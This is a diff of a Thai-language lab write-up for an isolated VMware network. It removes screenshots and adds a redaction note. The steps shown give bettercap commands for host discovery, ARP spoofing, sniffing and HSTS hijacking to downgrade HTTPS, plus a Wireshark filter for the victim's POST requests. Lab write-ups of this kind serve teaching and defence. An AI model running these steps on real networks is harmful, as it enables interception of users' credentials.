@@ -2,7 +2,9 @@
 
 > **⚠️ Authorized lab use only.** ทุกขั้นตอนทำในเครือข่ายทดลองแบบปิด (isolated VMware lab, subnet `192.168.174.0/24`) โดยเครื่องเหยื่อเป็น Windows VM ของผู้ทดลองเอง ไม่มีการโจมตีระบบจริง เว็บไซต์จริง หรือผู้ใช้จริงใด ๆ ทั้งสิ้น เผยแพร่เพื่อการศึกษาเท่านั้น การนำเทคนิคนี้ไปใช้กับระบบที่ไม่ได้รับอนุญาตเป็นความผิดตามกฎหมาย
 
-ชื่อโดเมน/สถาบันเป้าหมายจริงถูกแทนด้วย placeholder (`shop-example.com`, `bank-example.com`) ทั้งในข้อความและภาพประกอบ
+ชื่อโดเมน/สถาบันเป้าหมายจริงถูกแทนด้วย placeholder (`shop-example.com`, `bank-example.com`) ในข้อความ
+
+> 🖼️ **ภาพประกอบ (screenshots) จะถูกเพิ่มโดยผู้เขียนภายหลัง** — หลัง redact ชื่อโดเมน/สถาบันจริงออกจากภาพเรียบร้อย
 
 ---
 
@@ -35,12 +37,7 @@
    net.probe on      # ค้นหาอุปกรณ์ใน subnet
    net.show          # แสดง IP / MAC ที่พบ  → victim = 192.168.174.130
    ```
-
-   ![net.probe / net.show — device discovery](images/01_net_show.png)
-
-   ยืนยัน IP เครื่องเหยื่อด้วย `ipconfig` บน Windows VM:
-
-   ![victim ipconfig](images/02_victim_ipconfig.png)
+   ยืนยัน IP เครื่องเหยื่อด้วย `ipconfig` บน Windows VM
 
 4. **ARP spoofing (full duplex)** — วางตัวเป็น man-in-the-middle ระหว่าง victim กับ gateway
    ```
@@ -49,8 +46,6 @@
    arp.spoof on
    ```
 
-   ![arp.spoof on — MITM position](images/03_arp_spoof.png)
-
 5. **Sniff + HSTS hijack**
    ```
    set net.sniff.local true
@@ -58,16 +53,10 @@
    hstshijack/hstshijack   # inject / strip HTTPS, บังคับ downgrade เป็น HTTP
    ```
 
-   ![net.sniff on](images/04_net_sniff.png)
-
 6. **วิเคราะห์ด้วย Wireshark** — เลือก interface `eth0`, ตั้ง capture filter:
    ```
    ip.addr == 192.168.174.130 and http.request.method == "POST"
    ```
-
-   ![wireshark capture setup](images/05_wireshark_capture.png)
-
-   > หมายเหตุ: ภาพหน้า config caplet, ผลลัพธ์ credential ใน Wireshark และหน้า login ปลอม ไม่รวมไว้ในเอกสารสาธารณะนี้ เพราะยังแสดงชื่อโดเมนของสถาบันจริงที่ใช้ทดสอบใน lab
 
 ### ผลลัพธ์
 
